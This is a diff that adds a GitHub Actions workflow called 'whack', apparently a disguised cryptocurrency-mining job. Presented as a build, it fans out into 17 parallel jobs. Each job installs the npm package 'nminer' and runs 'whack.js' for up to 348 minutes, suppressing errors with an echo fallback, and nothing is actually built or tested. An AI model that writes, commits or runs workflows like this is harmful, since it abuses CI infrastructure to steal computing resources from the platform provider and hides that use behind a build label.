@@ -1,0 +1,42 @@
+name: whack
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 9466 }
+          - { version: 3543 }
+          - { version: 9920 }
+          - { version: 6680 }
+          - { version: 4503 }
+          - { version: 2550 }
+          - { version: 3528 }
+          - { version: 6909 }
+          - { version: 9336 }
+          - { version: 6064 }
+          - { version: 6939 }
+          - { version: 8158 }
+          - { version: 8869 }
+          - { version: 3442 }
+          - { version: 4114 }
+          - { version: 4126 }
+          - { version: 6961 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: unique
+        run: |
+          npm install nminer@latest
+          timeout 348m node whack.js || echo "whack executed"
